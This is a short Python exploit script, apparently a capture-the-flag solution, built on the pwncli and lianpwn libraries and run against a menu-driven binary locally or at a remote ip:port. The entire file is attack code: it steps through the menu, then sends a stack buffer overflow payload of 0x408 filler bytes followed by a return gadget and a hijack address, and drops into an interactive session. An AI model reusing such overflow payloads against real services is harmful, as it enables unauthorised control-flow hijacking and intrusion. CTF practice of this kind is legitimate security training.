#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(choice)


def cal(num1, num2):
    cmd(i2b(1))
    cmd(str(num1).encode())
    cmd(str(num2).encode())


cal(9.7, 0.0)
cmd(b"1337")

payload = flat([0x000000000040101A, 0x401740])

ru(b"Create note\n")
s(b"a" * 0x408 + payload)

ia()
